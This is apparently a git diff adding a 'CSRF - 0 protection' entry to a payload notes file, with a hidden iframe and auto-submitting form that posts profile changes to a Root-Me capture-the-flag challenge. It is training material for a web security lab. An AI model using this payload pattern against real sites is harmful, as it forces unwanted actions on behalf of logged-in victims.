@@ -79,3 +79,15 @@ Sample payload for bypassing CSRF Token:
                 document.csrf_form.submit();
 </script>
 ```
+
+### CSRF - 0 protection
+
+```
+<iframe style="display:none" name="csrf-frame"></iframe>
+    <form  id="csrf-form" target="csrf-frame" action="http://challenge01.root-me.org/web-client/ch22/index.php?action=profile" method="POST" enctype="multipart/form-data">
+      <input type="hidden" name="username" value="ad" />
+      <input type="hidden" name="status" value="on" />
+      <input type="submit" value="Submit request" />
+    </form>
+<script>document.getElementById("csrf-form").submit()</script>
+```
